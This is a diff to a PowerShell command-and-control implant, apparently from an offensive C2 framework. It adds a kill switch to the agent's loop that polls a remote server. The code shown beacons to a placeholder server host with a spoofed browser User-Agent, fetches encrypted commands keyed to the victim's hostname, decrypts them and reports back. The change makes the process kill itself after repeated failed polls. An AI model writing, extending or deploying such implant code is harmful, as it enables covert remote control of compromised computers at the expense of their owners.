@@ -66,9 +66,19 @@ $wch.add("Authorization", $encrypted_header);
 $wch.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
 
 $wc.downloadString("OCU_PROTO://SRVHOST/OCT_first_ping");
-
+$failure_counter = 0;
 while($true){
+
+    try{
     $command_raw = $wc2.downloadString("OCU_PROTO://SRVHOST/OCT_command/$final_hostname");
+    }catch{
+    $failure_counter=$failure_counter +1;
+    echo $failure_counter
+    if ($failure_counter -eq OCT_AKILL){
+    kill $pid
+    }
+    }
+
     $final_command = DecryptCommand $key $command_raw
     $fc = $final_command.Trim([char]0).Trim([char]1).Trim([char]2).Trim([char]3).Trim([char]4).Trim([char]5).Trim([char]6).Trim([char]7).Trim([char]8).Trim([char]9).Trim([char]10).Trim([char]11).Trim([char]12).Trim([char]13).Trim([char]14).Trim([char]15).Trim([char]16).Trim([char]17).Trim([char]18).Trim([char]19).Trim([char]20).Trim([char]21)
 
@@ -114,5 +124,6 @@ while($true){
         $wc3.downloadString("OCU_PROTO://SRVHOST/OCTRECV");
 
     }
+
     sleep $interval;
     }
